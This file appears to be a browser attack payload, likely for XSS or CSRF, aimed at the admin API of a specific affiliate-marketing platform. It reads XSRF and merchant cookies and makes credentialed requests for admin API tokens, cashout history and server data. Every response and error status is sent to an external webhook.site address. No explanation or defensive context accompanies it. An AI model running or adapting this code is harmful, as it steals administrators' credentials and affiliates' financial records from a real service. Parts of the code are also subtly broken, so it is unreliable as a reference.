const dataToSend = {
};

function getCookie(name) {
  const cookies = document.cookie.split('; ');
  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i];
    // Check if the cookie starts with the desired name and an equals sign
    if (cookie.startsWith(name + '=')) {
      // Return the value part of the cookie
      return decodeURIComponent(cookie.substring(name.length + 1));
    }
  }
  return null; // Return null if the cookie is not found
}

dataToSend.authenticity_token = getCookie("XSRF-TOKEN-X");
dataToSend.merchant = getCookie("merchant_id");

fetch('https://affiliates-api.ggpartners.com/api2/admin/profile/api_tokens', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
        "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});


fetch('https://affiliates-api.ggpartners1.com/api2/admin/profile/api_tokens', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
       "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

var xmlHttp = new XMLHttpRequest();
xmlHttp.withCredentials = true;
    xmlHttp.open( "GET", "https://affiliates-api.ggpartners.com/api2/admin/translate_manager/server_marks", false );
    xmlHttp.send( null );

var xmlHttp1 = new XMLHttpRequest();
    xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?a="+xmlHttp.responseText, false ); // false for synchronous request
    xmlHttp1.send( null );

var xmlHttp2 = new XMLHttpRequest();
xmlHttp2.withCredentials = true;
    xmlHttp2.open( "GET", "https://affiliates-api.ggpartners1.com/api2/admin/translate_manager/server_marks", false );
    xmlHttp2.send( null );

var xmlHttp3 = new XMLHttpRequest();
    xmlHttp3.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?a="+xmlHttp2.responseText, false ); // false for synchronous request
    xmlHttp3.send( null );
